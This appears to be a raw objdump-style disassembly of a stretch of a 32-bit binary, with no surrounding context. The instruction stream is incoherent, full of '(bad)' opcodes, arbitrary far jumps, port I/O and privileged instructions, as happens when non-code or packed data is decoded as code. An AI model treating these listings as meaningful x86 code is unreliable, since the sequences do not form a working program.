  40987f:	arpl   WORD PTR [ecx+0x64],bx
  409882:	shr    eax,1
  409884:	fdiv   QWORD PTR [edi+0x31a6ff99]
  40988a:	mov    esi,DWORD PTR [esi-0x75a1bf2d]
  409890:	jmp    0xd5e7:0xb7aa5669
  409897:	cdq    
  409898:	ret    0xe9a
  40989b:	call   0xfef1:0xe5e801de
  4098a2:	popf   
  4098a3:	push   esp
  4098a4:	test   eax,0xbf3059d3
  4098a9:	push   esi
  4098aa:	cmp    al,0xfa
  4098ac:	in     al,dx
  4098ad:	inc    esp
  4098ae:	(bad)  
  4098af:	aas    
  4098b0:	mov    WORD PTR [eax+0x2f4d39d],es
  4098b6:	pop    edi
  4098b7:	inc    edi
  4098b8:	mov    esp,0xb745dc61
  4098bd:	mov    ecx,0x1ce8b66b
  4098c2:	retf   0x2cfd
  4098c5:	outs   dx,BYTE PTR ds:[esi]
  4098c6:	adc    DWORD PTR ds:[ebx-0x46],edi
  4098ca:	pop    es
  4098cb:	adc    eax,0x5c5f3f88
  4098d0:	int3   
  4098d1:	lds    edi,FWORD PTR [ecx]
  4098d3:	push   esp
  4098d4:	test   DWORD PTR [edx-0x6b2d3fe6],ebx
  4098da:	xchg   bl,ch
  4098dc:	(bad)  
  4098dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098de:	xchg   ebp,eax
  4098df:	sub    eax,0x740072f5
  4098e4:	jo     0x4098c5
  4098e6:	mov    edi,0xbda86eea
  4098eb:	pusha  
  4098ec:	std    
  4098ed:	fstp   QWORD PTR [edi+0x70]
  4098f0:	xor    edi,DWORD PTR [ebp-0x22ca109b]
  4098f6:	inc    ebp
  4098f7:	outs   dx,BYTE PTR ds:[esi]
  4098f8:	xor    eax,0x8faa06e7
  4098fd:	mov    ds:0x38be3420,eax
  409902:	xor    DWORD PTR [edi],ebp
  409904:	pop    eax
  409905:	aas    
  409906:	sub    bl,BYTE PTR [edi-0x71]
  409909:	test   BYTE PTR [edx+ecx*2],dh
  40990c:	mov    cl,0xfb
  40990e:	sub    BYTE PTR [esi],ch
  409910:	pop    ss
  409911:	mov    al,0x9a
  409913:	rol    DWORD PTR [esi+0x6c],0xdd
  409917:	das    
  409918:	push   eax
  409919:	add    ah,BYTE PTR [ecx+edx*2]
  40991c:	push   edx
  40991d:	cli    
  40991e:	inc    edi
  40991f:	retf   0xbe36
  409922:	cwde   
  409923:	mov    esi,0x796d276d
  409928:	lahf   
  409929:	pop    ebx
  40992a:	or     ah,BYTE PTR gs:[ecx-0x58c5c04f]
  409931:	sub    ecx,ecx
  409933:	call   0x5c92:0xef68c489
  40993a:	xchg   ecx,eax
  40993b:	mov    ebx,0x8621757c
  409940:	sbb    ebp,DWORD PTR [edi]
  409942:	xor    BYTE PTR [ebp+0x46],ch
  409945:	int3   
  409946:	add    eax,0x4a5580e1
  40994b:	in     eax,0x2a
  40994d:	popf   
  40994e:	inc    edi
  40994f:	ja     0x409936
  409951:	lahf   
  409952:	mov    ebp,DWORD PTR [ecx+0x563e5efe]
  409958:	gs mov ecx,cs
  40995b:	out    0x2b,eax
  40995d:	arpl   si,si
  40995f:	inc    eax
  409960:	retf   0x517
  409963:	mov    ebp,0x4d72461e
  409968:	in     eax,0xd9
  40996a:	pop    ebx
  40996b:	retf   0xf75d
  40996e:	aaa    
  40996f:	sub    al,0xbc
  409971:	cmp    ch,ch
  409973:	ficomp DWORD PTR [ebp-0x77]
  409976:	dec    ecx
  409977:	rol    DWORD PTR [ebx-0xb],0x20
  40997b:	sub    al,0xa2
  40997d:	dec    esp
  40997e:	lods   al,BYTE PTR ds:[esi]
  40997f:	mov    ch,bl
  409981:	push   ebx
  409982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409983:	dec    ebp
  409984:	sub    esi,ebp
  409986:	aam    0xf
  409988:	out    0x71,eax
  40998a:	xlat   BYTE PTR ds:[ebx]
  40998b:	(bad)  
  40998c:	cmc    
  40998d:	sub    ch,0xa9
  409990:	rcr    DWORD PTR [esi-0x59],cl
  409993:	xchg   DWORD PTR [ebx],ebx
  409995:	and    BYTE PTR [esi],0x25
  409998:	outs   dx,BYTE PTR ds:[esi]
  409999:	push   edx
  40999a:	retf   
  40999b:	xor    edx,DWORD PTR [edx]
  40999d:	mov    ah,0x4d
  40999f:	add    al,0xd0
  4099a1:	pop    esi
  4099a2:	mov    ecx,0xf2b7b898
  4099a7:	pop    DWORD PTR [edi+edx*2-0x77]
  4099ab:	push   cs
  4099ac:	jnp    0x40997c
  4099ae:	out    dx,al
  4099af:	jg     0x4099bc
  4099b1:	mov    edi,0x6abaca63
  4099b6:	or     edi,ebp
  4099b8:	inc    eax
  4099b9:	xchg   ebx,eax
  4099ba:	(bad)  
  4099bb:	call   0xfc43:0x209632f0
  4099c2:	fbstp  TBYTE PTR [eax+eax*2-0x4a834e28]
  4099c9:	xchg   DWORD PTR ds:0x6cb0d294,esp
  4099cf:	(bad)  
  4099d0:	ins    DWORD PTR es:[edi],dx
  4099d1:	jb     0x409a41
  4099d3:	adc    eax,0xd050404a
  4099d8:	jne    0x409a53
  4099da:	lds    esi,FWORD PTR [ecx]
  4099dc:	xchg   esi,eax
  4099dd:	mov    esi,0x12886120
  4099e2:	mov    al,0x72
  4099e4:	cli    
  4099e5:	imul   ecx,DWORD PTR ds:0x7e0fd0c5,0x443adda2
  4099ef:	imul   DWORD PTR [eax+0x1a7fd047]
  4099f5:	dec    esp
  4099f6:	pop    eax
  4099f7:	es dec ecx
  4099f9:	loopne 0x409993
  4099fb:	pushf  
  4099fc:	inc    edx
  4099fd:	mov    dh,0x9c
  4099ff:	push   esi
  409a00:	jl     0x409a76
  409a02:	test   BYTE PTR [edi+0x17],dl
  409a05:	pop    edi
  409a06:	les    esi,FWORD PTR [edx-0x6acbe7d7]
  409a0c:	shr    BYTE PTR [ebp+0x72],0x2b
  409a10:	and    BYTE PTR [edi-0x5288c1f4],cl
  409a16:	jge    0x409a75
  409a18:	aas    
  409a19:	loop   0x409a3e
  409a1b:	fist   WORD PTR [ebx+ebp*2-0x46]
  409a1f:	fdivr  QWORD PTR [esi+eiz*4]
  409a22:	stos   DWORD PTR es:[edi],eax
  409a23:	in     al,dx
  409a24:	ja     0x4099e8
  409a26:	jmp    0x95d1444a
  409a2b:	into   
  409a2c:	dec    ecx
  409a2d:	inc    edi
  409a2e:	jmp    0x3a4518e6
  409a33:	dec    esi
  409a34:	mov    esp,0xb577b57b
  409a39:	into   
  409a3a:	iret   
  409a3b:	adc    al,0xbc
  409a3d:	icebp  
  409a3e:	imul   eax,DWORD PTR [ecx+0x5c],0x2c938187
  409a45:	retf   
  409a46:	or     BYTE PTR [edi-0xb],cl
  409a49:	sahf   
  409a4a:	mov    BYTE PTR [eax-0x5c],0xbe
  409a4e:	and    al,0xfa
  409a50:	xchg   ebp,eax
  409a51:	out    dx,eax
  409a52:	scas   al,BYTE PTR es:[edi]
  409a53:	mov    ah,BYTE PTR [eax-0x51d2798c]
  409a59:	cmp    eax,0x6abd1986
  409a5e:	imul   esp,esi,0xb5dd0133
  409a64:	pop    DWORD PTR [ebp-0xd]
  409a67:	out    0xc4,al
  409a69:	mov    ecx,0xa9f0b5b6
  409a6e:	iret   
  409a6f:	cmp    WORD PTR [edi+eiz*4+0x14249438],0xdc20
  409a79:	ins    BYTE PTR es:[edi],dx
  409a7a:	cmp    eax,0x60decbb2
  409a7f:	loop   0x409af9
  409a81:	hlt    
  409a82:	cmp    al,0x16
  409a84:	fsubp  st(4),st
  409a86:	inc    edx
  409a87:	jl     0x409afc
  409a89:	inc    esp
  409a8a:	and    al,0x56
  409a8c:	xchg   edx,eax
  409a8d:	sub    al,0x29
  409a8f:	loopne 0x409a8b
  409a91:	daa    
  409a92:	dec    ebx
  409a93:	aad    0x8f
  409a95:	sti    
  409a96:	out    dx,al
  409a97:	inc    edi
  409a98:	fldcw  WORD PTR [edx+0x55]
  409a9b:	jg     0x409a29
  409a9d:	fmulp  st(5),st
  409a9f:	pop    es
  409aa0:	xchg   edx,eax
  409aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa2:	scas   al,BYTE PTR es:[edi]
  409aa3:	xor    dh,al
  409aa5:	and    BYTE PTR [eax+0x39],al
  409aa8:	pop    esp
  409aa9:	int    0x49
  409aab:	shr    ch,0xd8
  409aae:	loopne 0x409b28
  409ab0:	jle    0x409af1
  409ab2:	sub    edx,DWORD PTR [edx-0x9bd4345]
  409ab8:	mov    ds:0x1269d51c,eax
  409abd:	std    
  409abe:	cmpxchg DWORD PTR [ecx+0x75],ecx
  409ac2:	gs in  al,dx
  409ac4:	fs dec ebx
  409ac6:	ror    BYTE PTR [edi+0x32],1
  409ac9:	adc    eax,0x98a43f09
  409ace:	ds inc ecx
  409ad0:	imul   eax,DWORD PTR [edx+edx*8-0x77],0xffffffe0
  409ad5:	adc    dh,cl
  409ad7:	int    0xa
  409ad9:	mov    eax,0xc1ea488c
  409ade:	test   al,0x61
  409ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ae1:	xor    edx,esp
  409ae3:	out    dx,al
  409ae4:	cmp    al,0x98
  409ae6:	xchg   esp,eax
  409ae7:	dec    eax
  409ae8:	rcr    DWORD PTR [eax-0x3c],cl
  409aeb:	outs   dx,BYTE PTR ds:[esi]
  409aec:	repz push 0x9f16b021
  409af2:	leave  
  409af3:	test   DWORD PTR [edx+0x4c],ecx
  409af6:	push   ebx
  409af7:	neg    BYTE PTR [edx]
  409af9:	scas   al,BYTE PTR es:[edi]
  409afa:	mov    edi,0x30b85704
  409aff:	pop    es
  409b00:	es xor eax,0xcdda9380
  409b06:	mov    ch,0x6
  409b08:	or     al,0x55
  409b0a:	(bad)  
  409b0b:	xchg   edi,eax
  409b0c:	cli    
  409b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b0e:	ja     0x409b37
  409b10:	adc    ch,BYTE PTR [edx]
  409b12:	rcl    BYTE PTR [edi-0x64],cl
  409b15:	into   
  409b16:	xor    eax,0x43d2a246
  409b1b:	popa   
  409b1c:	mov    DWORD PTR [ebx+edi*1],0x7e1e316e
  409b23:	jnp    0x409ad3
  409b25:	iret   
  409b26:	scas   eax,DWORD PTR es:[edi]
  409b27:	xchg   ebp,eax
  409b28:	push   esp
  409b29:	fnsave [edx]
  409b2b:	es inc ebx
  409b2d:	add    BYTE PTR [ebx-0x15],bl
  409b30:	sbb    al,0x18
  409b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b33:	repz adc eax,0xcdea973f
  409b39:	cdq    
  409b3a:	sub    al,0xf8
  409b3c:	js     0x409afd
  409b3e:	adc    al,0xa4
  409b40:	and    eax,0xe79cba3f
  409b45:	adc    edx,DWORD PTR [edi+0x66681772]
  409b4b:	cmp    ecx,esp
  409b4d:	xor    eax,0xc55f5b11
  409b52:	mov    ecx,DWORD PTR [ecx]
  409b54:	inc    edi
  409b55:	inc    DWORD PTR [ebp+edi*1-0x22467c82]
  409b5c:	dec    esp
  409b5d:	pop    esp
  409b5e:	mov    ch,0xe6
  409b60:	shl    BYTE PTR [ecx+0x72724f43],cl
  409b66:	push   ebx
  409b67:	cmp    eax,0xad446271
  409b6c:	leave  
  409b6d:	(bad)  
  409b6e:	neg    esp
  409b70:	sbb    DWORD PTR [esi],ebx
  409b72:	add    esp,0xee0e3565
  409b78:	outs   dx,BYTE PTR ds:[esi]
  409b79:	pop    edx
  409b7a:	jecxz  0x409b96
  409b7c:	gs (bad) 
  409b7e:	int3   
  409b7f:	iret   
  409b80:	loope  0x409b81
  409b82:	stos   BYTE PTR es:[edi],al
  409b83:	(bad)  
  409b84:	mov    dh,0x55
  409b86:	inc    esp
  409b87:	pop    ecx
  409b88:	shld   DWORD PTR [esp+edi*4+0x10],edx,0x9c
  409b8e:	or     dl,ch
  409b90:	add    BYTE PTR [ebp+ecx*1-0x9],bh
  409b94:	aaa    
  409b95:	sub    ebx,DWORD PTR [ebx]
  409b97:	sar    DWORD PTR [esi+ebx*2-0x28],0x43
  409b9c:	mov    eax,ds:0xa15dc00f
  409ba1:	add    DWORD PTR [edi-0x3],ebp
  409ba4:	sbb    eax,0x7b6ba8e8
  409ba9:	loopne 0x409ba3
  409bab:	xor    DWORD PTR [ecx+eax*2],esi
  409bae:	pop    esi
  409baf:	mov    dl,0x87
  409bb1:	les    esp,FWORD PTR [ecx-0xcbc7099]
  409bb7:	lods   eax,DWORD PTR ds:[esi]
  409bb8:	inc    ecx
  409bb9:	jb     0x409be7
  409bbb:	cmp    al,0xaa
  409bbd:	loope  0x409b89
  409bbf:	xlat   BYTE PTR ds:[ebx]
  409bc0:	mov    esi,0x356e3606
  409bc5:	push   ds
  409bc6:	mov    ebx,0x7c9fe838
  409bcb:	iret   
  409bcc:	inc    ecx
  409bcd:	inc    ebx
  409bce:	adc    DWORD PTR [ebx-0x2f242b1f],esi
  409bd4:	(bad)  
  409bd5:	loope  0x409c40
  409bd7:	sbb    al,0x5f
  409bd9:	sbb    dl,BYTE PTR [esi+0x73]
  409bdc:	mov    ebx,0x47abba8a
  409be1:	popf   
  409be2:	inc    esp
  409be3:	pop    ds
  409be4:	inc    esp
  409be5:	inc    esp
  409be6:	fdiv   QWORD PTR [eax-0x7d]
  409be9:	out    0x25,al
  409beb:	push   ecx
  409bec:	lods   al,BYTE PTR ds:[esi]
  409bed:	jmp    0x409be1
  409bef:	sahf   
  409bf0:	and    bl,al
  409bf2:	and    DWORD PTR [ebp+esi*8-0x59],edi
  409bf6:	pop    esi
  409bf7:	(bad)  
  409bf8:	jne    0x409c2d
  409bfa:	sub    ch,bl
  409bfc:	xchg   esp,eax
  409bfd:	or     eax,0xdf4e0cf4
  409c02:	sub    al,0xb5
  409c04:	retf   0xc2b5
  409c07:	mov    bl,0x89
  409c09:	int3   
  409c0a:	imul   eax,DWORD PTR [edx+0x64],0x89648e6a
  409c11:	cmp    ebp,DWORD PTR [esp+esi*1-0x27]
  409c15:	test   al,0x2
  409c17:	ds pusha 
  409c19:	aaa    
  409c1a:	dec    esp
  409c1b:	push   edx
  409c1c:	or     esi,eax
  409c1e:	adc    ch,bl
  409c20:	inc    edi
  409c21:	pop    ebp
  409c22:	ins    BYTE PTR es:[edi],dx
  409c23:	pop    ss
  409c24:	mov    ch,0xa5
  409c26:	shl    BYTE PTR [eax+0x1af84dba],cl
  409c2c:	repnz cdq 
  409c2e:	xchg   esp,eax
  409c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c30:	mov    bl,0x61
  409c32:	dec    edx
  409c33:	(bad)  
  409c34:	mov    dl,BYTE PTR [edi-0x2e]
  409c37:	jge    0x409be9
  409c39:	dec    ebx
  409c3a:	shr    DWORD PTR [ebp+0x73c92c7d],cl
  409c40:	mov    eax,0xc6e2ad0f
  409c45:	dec    ebp
  409c46:	adc    bl,BYTE PTR [ebx]
  409c48:	jo     0x409be9
  409c4a:	mov    ebp,0x4de48dfa
  409c4f:	(bad)  
  409c50:	and    DWORD PTR [edi+0x28e1def9],0x3c
  409c57:	in     eax,0xda
  409c59:	hlt    
  409c5a:	ret    0xb57a
  409c5d:	fadd   st,st(1)
  409c5f:	jbe    0x409c42
  409c61:	int    0x18
  409c63:	rol    BYTE PTR [ebp-0x18],1
  409c66:	mov    eax,DWORD PTR [ebx]
  409c68:	lahf   
  409c69:	shr    DWORD PTR [edx+0x33429ae8],1
  409c6f:	cwde   
  409c70:	mov    bl,0x76
  409c72:	enter  0xb107,0x80
  409c76:	adc    ah,BYTE PTR [edx+0x76]
  409c79:	jno    0x409c9e
  409c7b:	jecxz  0x409cf0
  409c7d:	push   0x4a
  409c7f:	in     al,0x75
  409c81:	(bad)  
  409c82:	cmp    DWORD PTR [ebx+0x30],0x6620154d
  409c89:	imul   BYTE PTR [ecx]
  409c8b:	or     ch,bh
  409c8d:	lods   al,BYTE PTR ds:[esi]
  409c8e:	sub    ch,ch
  409c90:	sub    esi,DWORD PTR [eax+0x2dd841a]
  409c96:	jne    0x409cac
  409c98:	stos   DWORD PTR es:[edi],eax
  409c99:	int    0x6d
  409c9b:	xor    DWORD PTR ds:0x4048d6ee,ebp
  409ca1:	addr16 push ebx
  409ca3:	loope  0x409c4f
  409ca5:	cs inc esp
  409ca7:	ins    DWORD PTR es:[edi],dx
  409ca8:	(bad)  
  409ca9:	mov    fs,WORD PTR [ebx-0x4d]
  409cac:	sub    eax,DWORD PTR ds:0xcf164367
  409cb2:	xchg   BYTE PTR [esp+ebx*1-0x2b],bh
  409cb6:	add    eax,0x7648e4e9
  409cbb:	nop
  409cbc:	add    ebp,DWORD PTR ds:0x6d4b2973
  409cc2:	pop    ss
  409cc3:	add    eax,0xfde98011
  409cc8:	xor    eax,0x619d348a
  409ccd:	or     ecx,DWORD PTR [edi+edi*8-0x74]
  409cd1:	ins    DWORD PTR es:[edi],dx
  409cd2:	mov    ds:0x65350e49,eax
  409cd7:	add    eax,DWORD PTR [ecx+0x6e]
  409cda:	dec    ecx
  409cdb:	in     eax,0x4b
  409cdd:	hlt    
  409cde:	ja     0x409d30
  409ce0:	jbe    0x409cc1
  409ce2:	data16 jno 0x409ce8
  409ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ce6:	dec    ebp
  409ce7:	fs clc 
  409ce9:	mov    dh,0x9a
  409ceb:	jmp    0x409ccd
  409ced:	stos   DWORD PTR es:[edi],eax
  409cee:	aad    0x4d
  409cf0:	dec    edi
  409cf1:	in     eax,0x54
  409cf3:	retf   
  409cf4:	retf   
  409cf5:	mov    esi,0xc2a3de5b
  409cfa:	mov    ch,0x69
  409cfc:	xlat   BYTE PTR ds:[ebx]
  409cfd:	sbb    DWORD PTR [ebp+edi*4+0x4b],esi
  409d01:	out    0xf4,al
  409d03:	sti    
  409d04:	aam    0x14
  409d06:	addr16 in al,0x44
  409d09:	iret   
  409d0a:	shr    esi,cl
  409d0c:	aam    0x23
  409d0e:	cmp    ebx,DWORD PTR [edi]
  409d10:	inc    ecx
  409d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d12:	mov    dl,0x3f
  409d14:	add    BYTE PTR [edx],cl
  409d16:	inc    bh
  409d18:	mov    edx,0xc015c5a4
  409d1d:	(bad)  
  409d1e:	call   0x20a6def2
  409d23:	dec    ebp
  409d24:	aad    0x6a
  409d26:	repz sub al,0x5a
  409d29:	(bad)  
  409d2a:	mov    eax,0x3fe74bd5
  409d2f:	inc    ebx
  409d30:	dec    edi
  409d31:	fxch   st(2)
  409d33:	ins    DWORD PTR es:[edi],dx
  409d34:	aaa    
  409d35:	mov    BYTE PTR [ecx+0x5632c041],bl
  409d3b:	repz xchg edx,eax
  409d3d:	in     eax,dx
  409d3e:	cmp    BYTE PTR [eax+0x0],al
  409d41:	jb     0x409d50
  409d43:	ins    BYTE PTR es:[edi],dx
  409d44:	mov    ecx,0x23dd76d2
  409d49:	ret    
  409d4a:	mov    esp,0x1f1467ae
  409d4f:	jns    0x409dd0
  409d51:	push   0x59
  409d53:	push   edi
  409d54:	push   ecx
  409d55:	mov    ds:0xb265f25,al
  409d5a:	and    ebp,DWORD PTR [eax]
  409d5c:	aad    0xfd
  409d5e:	or     ebx,DWORD PTR [esi]
  409d60:	out    0xfd,al
  409d62:	fsubr  QWORD PTR [edx+0x58]
  409d65:	scas   al,BYTE PTR es:[edi]
  409d66:	push   ebp
  409d67:	sub    ah,BYTE PTR [ebx-0x753d7877]
  409d6d:	add    al,0x64
  409d6f:	add    eax,0x6160ab18
  409d74:	(bad)  
  409d75:	xor    edi,DWORD PTR [eax]
  409d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d78:	sahf   
  409d79:	sbb    BYTE PTR [edi-0x3f13bad2],ch
  409d7f:	les    edx,FWORD PTR [ecx-0x68d33f85]
  409d85:	outs   dx,BYTE PTR ds:[esi]
  409d86:	mov    dl,0x3c
  409d88:	int3   
  409d89:	xchg   dh,dh
  409d8b:	jge    0x409d49
  409d8d:	aad    0xcc
  409d8f:	call   0x999c:0x7f1d3ab5
  409d96:	mov    eax,ds:0x7e3017e8
  409d9b:	pop    ebp
  409d9c:	iret   
  409d9d:	rcr    DWORD PTR [ecx-0x53],cl
  409da0:	mov    ds:0x90d3240f,eax
  409da5:	jne    0x409e0b
  409da7:	sbb    edx,DWORD PTR [esi-0x1e]
  409daa:	push   0x62ced999
  409daf:	out    0xe0,eax
  409db1:	pushf  
  409db2:	fdivr  QWORD PTR [edi+0x203bc0df]
  409db8:	cmp    edx,DWORD PTR [ecx+0x2e2e5f80]
  409dbe:	fucom  st(7)
  409dc0:	xlat   BYTE PTR ds:[ebx]
  409dc1:	sbb    dl,ch
  409dc3:	imul   ebp,DWORD PTR [ecx],0x23a10654
  409dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dca:	jmp    0x409df3
  409dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dcd:	pop    ebp
  409dce:	sbb    BYTE PTR [ebx-0x6d],dl
  409dd1:	outs   dx,BYTE PTR ds:[esi]
  409dd2:	aaa    
  409dd3:	mov    BYTE PTR [eax],ch
  409dd5:	xchg   DWORD PTR [edi],ebx
  409dd7:	(bad)  
  409dd8:	int    0x66
  409dda:	sub    al,0x1e
  409ddc:	ja     0x409dfc
  409dde:	sbb    dh,dl
  409de0:	and    edx,DWORD PTR [esi+edx*1]
  409de3:	jne    0x409e1f
  409de5:	sub    ah,BYTE PTR [edi-0x6f96cd58]
  409deb:	and    al,0x2d
  409ded:	lock inc ecx
  409def:	mov    esi,0xb7a2ffb9
  409df4:	mov    dl,0x6b
  409df6:	out    dx,eax
  409df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409df8:	cmp    ch,BYTE PTR [ecx]
  409dfa:	(bad)  
  409dfb:	dec    ebp
  409dfc:	dec    ecx
  409dfd:	jg     0x409e33
  409dff:	pop    esp
  409e00:	std    
  409e01:	(bad)  
  409e02:	adc    BYTE PTR [ebx-0x6b410506],bl
  409e08:	adc    BYTE PTR [ecx-0x8],ch
  409e0b:	(bad)  
  409e0c:	dec    edx
  409e0d:	test   DWORD PTR [ecx+0x47],ebp
  409e10:	jmp    0x1431:0xb744c83
  409e17:	cdq    
  409e18:	(bad)  
  409e19:	sti    
  409e1a:	push   0x2ddbc89d
  409e1f:	mov    ebx,0xd4185b72
  409e24:	aam    0x12
  409e26:	mov    ?,WORD PTR [ecx+0x2a]
  409e29:	cmp    edi,DWORD PTR [esi-0x21]
  409e2c:	mov    bh,0x50
  409e2e:	dec    edx
  409e2f:	out    dx,eax
  409e30:	fsubrp st(4),st
  409e32:	js     0x409e8a
  409e34:	nop
  409e35:	pop    ebx
  409e36:	dec    esp
  409e37:	add    al,0xfa
  409e39:	and    dh,BYTE PTR [eax+edi*1-0x2518e269]
  409e40:	nop
  409e41:	sbb    eax,0xd8e58ea8
  409e46:	js     0x409ddd
  409e48:	jecxz  0x409eb1
  409e4a:	rol    BYTE PTR [eax-0x55],0xbf
  409e4e:	std    
  409e4f:	ds mov edx,0xd8c9534c
  409e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e56:	cmp    dl,al
  409e58:	inc    ebp
  409e59:	dec    edx
  409e5a:	aad    0xb4
  409e5c:	inc    ecx
  409e5d:	imul   edx,DWORD PTR [edx],0x9943c662
  409e63:	push   edi
  409e64:	push   edx
  409e65:	scas   eax,DWORD PTR es:[edi]
  409e66:	lock pop ecx
  409e68:	loope  0x409e1c
  409e6a:	jl     0x409eea
  409e6c:	fdiv   DWORD PTR [esi-0x23e2c679]
  409e72:	(bad)  
  409e74:	test   DWORD PTR [ebx+0xc],eax
  409e77:	dec    ebx
  409e78:	fmul   st(0),st
  409e7a:	ret    
  409e7b:	mov    esp,0xce592af0
  409e80:	leave  
  409e81:	out    0x4c,al
  409e83:	pop    es
  409e84:	fdivr  DWORD PTR [edx]
  409e86:	add    DWORD PTR [ecx-0x6502c0cb],ebp
  409e8c:	dec    edx
  409e8d:	je     0x409e97
  409e8f:	add    ah,ch
  409e91:	div    BYTE PTR [ecx-0x7aeb34f2]
  409e97:	cmp    ah,BYTE PTR es:[eax+0x2a3952d6]
  409e9e:	and    BYTE PTR [edi-0x39],dl
  409ea1:	add    bh,bh
  409ea3:	lods   eax,DWORD PTR ds:[esi]
  409ea4:	cli    
  409ea5:	out    0x56,eax
  409ea7:	dec    ecx
  409ea8:	jne    0x409f11
  409eaa:	dec    eax
  409eab:	repz push ds
  409ead:	rcr    BYTE PTR [ebp+0xe],1
  409eb0:	aam    0xe
  409eb2:	loope  0x409e9c
  409eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eb6:	ja     0x409f1a
  409eb8:	dec    eax
  409eb9:	sbb    ecx,DWORD PTR [ebx*1+0x4b1c13dd]
  409ec0:	pop    esi
  409ec1:	retf   
  409ec2:	push   ss
  409ec3:	(bad)  
  409ec4:	mov    ?,WORD PTR [edi-0x1c7a8c47]
  409eca:	in     eax,0x5b
  409ecc:	shl    BYTE PTR [ecx+0x70],1
  409ecf:	cmp    bh,BYTE PTR [eax]
  409ed1:	jns    0x409ec0
  409ed3:	jbe    0x409f2d
  409ed5:	test   DWORD PTR [ecx],edx
  409ed7:	xchg   esi,eax
  409ed8:	push   cs
  409ed9:	mov    edi,0x6dcff90
  409ede:	mov    BYTE PTR [edi+0x2813d4fe],dl
  409ee4:	das    
  409ee5:	mov    dl,0xbf
  409ee7:	jp     0x409e92
  409ee9:	pop    ebx
  409eea:	sbb    ebp,ebp
  409eec:	jbe    0x409e6e
  409eee:	pop    eax
  409eef:	iret   
  409ef0:	test   DWORD PTR [edx-0x37],edi
  409ef3:	push   cs
  409ef4:	jg     0x409f70
  409ef6:	push   ebp
  409ef7:	(bad)  
  409ef8:	adc    eax,0x23cf3a28
  409efd:	mov    cl,0xfc
  409eff:	cli    
  409f00:	mov    eax,0xe4bce548
  409f05:	popf   
  409f06:	mov    cl,0xe3
  409f08:	stos   DWORD PTR es:[edi],eax
  409f09:	lds    ecx,FWORD PTR [edx+0x26ab815b]
  409f0f:	dec    esp
  409f10:	je     0x409eee
  409f12:	jmp    0x77d5:0xce735404
  409f19:	push   esp
  409f1a:	or     BYTE PTR [esp+eax*4],dh
  409f1d:	lds    ebp,FWORD PTR [edx]
  409f1f:	leave  
  409f20:	xor    DWORD PTR [ebx+eax*8+0x38],eax
  409f24:	test   ch,dl
  409f26:	jg     0x409f6f
  409f28:	shl    ch,cl
  409f2a:	call   0x1e62aea6
  409f2f:	add    bh,BYTE PTR [esi-0x6839f1b9]
  409f35:	aas    
  409f36:	(bad)  
  409f37:	sbb    ecx,DWORD PTR [edx+0x0]
  409f3a:	repnz adc bh,BYTE PTR [ebx+0x6d]
  409f3e:	push   ecx
  409f3f:	cmp    eax,0x4921e095
  409f44:	sar    BYTE PTR [ecx-0x6b423207],0x33
  409f4b:	jb     0x409f31
  409f4d:	(bad)  
  409f4e:	jmp    0xe519:0x9b467272
  409f55:	lock xchg DWORD PTR [eax],ecx
  409f58:	retf   
  409f59:	add    al,0xa0
  409f5b:	ins    DWORD PTR es:[edi],dx
  409f5c:	fistp  QWORD PTR [edx-0x23f64ac6]
  409f62:	scas   ax,WORD PTR es:[edi]
  409f64:	cld    
  409f65:	mov    DWORD PTR [ecx+0x55f23be],edx
  409f6b:	std    
  409f6c:	call   0xa3ff6a6c
  409f71:	or     esp,DWORD PTR [edi+0x53ecd620]
  409f77:	xor    DWORD PTR [esi+0x2390f958],esp
  409f7d:	cwde   
  409f7e:	inc    esi
  409f7f:	push   edi
  409f80:	mov    ch,0x61
  409f82:	xchg   BYTE PTR [ebx+esi*4+0x67859ca2],bl
  409f89:	jne    0x409f8b
  409f8b:	dec    ebx
  409f8c:	push   esi
  409f8d:	xchg   edi,eax
  409f8e:	gs xchg esi,eax
  409f90:	scas   eax,DWORD PTR es:[edi]
  409f91:	adc    eax,0x5b54a153
  409f96:	and    BYTE PTR [eax],al
  409f98:	ins    DWORD PTR es:[edi],dx
  409f99:	in     eax,dx
  409f9a:	fwait
  409f9b:	inc    esi
  409f9c:	dec    edi
  409f9d:	dec    ebx
  409f9e:	mov    dh,0x9f
  409fa0:	pop    edx
  409fa1:	xchg   ebp,eax
  409fa2:	mov    eax,0x695fa629
  409fa7:	test   BYTE PTR [ebp+0x1a],0xff
  409fab:	inc    ebx
  409fac:	js     0x409f55
  409fae:	test   BYTE PTR [ebx+0x111453f0],al
  409fb4:	mov    ds:0x93a46498,eax
  409fb9:	stos   DWORD PTR es:[edi],eax
  409fba:	sbb    bh,cl
  409fbc:	ja     0x409fbc
  409fbe:	sbb    edi,DWORD PTR [ecx-0x1d]
  409fc1:	enter  0x8dce,0xfd
  409fc5:	and    bh,bl
  409fc7:	jo     0x409fc3
  409fc9:	jno    0x409fe0
  409fcb:	mov    eax,ds:0xc3d77d25
  409fd0:	mov    ds:0x8138ffbe,eax
  409fd5:	dec    edx
  409fd6:	clc    
  409fd7:	stc    
  409fd8:	nop
  409fd9:	fidivr DWORD PTR [ebp+0x69322172]
  409fdf:	pop    es
  409fe0:	loop   0x409fe6
  409fe2:	cwde   
  409fe3:	xchg   esp,eax
  409fe4:	ja     0x40a01c
  409fe6:	push   0x38
  409fe8:	add    BYTE PTR [esi-0x57df9c33],dh
  409fee:	enter  0x918f,0xa1
  409ff2:	clc    
  409ff3:	lea    ebx,[ebp-0x7]
  409ff6:	pop    esi
  409ff7:	mov    ebx,0x98ddcb80
  409ffc:	mov    ebx,0xf6ccd8f7
